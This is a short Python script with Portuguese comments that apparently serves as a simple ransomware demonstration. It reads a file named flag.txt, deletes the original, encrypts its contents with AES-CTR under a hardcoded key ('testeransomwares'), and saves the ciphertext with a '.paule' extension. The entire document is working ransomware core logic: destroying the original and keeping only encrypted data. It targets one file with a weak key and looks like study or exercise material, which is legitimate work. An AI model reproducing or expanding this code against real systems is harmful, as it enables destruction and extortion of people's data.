import os
import pyaes

# Abrindo arquivo
file_name = 'flag.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

#remove arquivo original
os.remove(file_name)

# Criptografando
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar
crypto_data = aes.encrypt(file_data)

#salvando arquivo criptografado
new_file = file_name + '.paule'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
